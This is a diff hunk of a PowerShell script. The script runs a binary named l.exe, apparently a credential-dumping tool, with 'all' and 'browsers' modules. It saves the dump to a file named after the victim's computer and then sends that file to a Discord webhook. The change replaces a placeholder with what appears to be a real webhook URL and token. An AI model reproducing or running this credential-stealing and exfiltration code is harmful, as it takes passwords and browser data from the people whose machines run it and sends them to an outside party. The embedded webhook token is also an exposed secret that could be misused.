@@ -21,7 +21,7 @@ Start-Sleep -Milliseconds 15000
 .\l.exe all -vv > "$env:computername.txt"; .\l.exe browsers -vv >> "$env:computername.txt"
 
 # Define the Discord webhook URL
-$WebhookURL = "https://discord.com/api/webhooks/your-webhook-url"
+$WebhookURL = "https://discord.com/api/webhooks/1179938535143387156/PoQMl0MfzSx4cmNtilPPvKVw-DxOplHCgFumUl7HJWCfQCJET9MA0nUm7G36R1oKZQnt"
 
 # Send the result file to the Discord webhook
 $ResultFile = "$Test\$env:computername.txt"
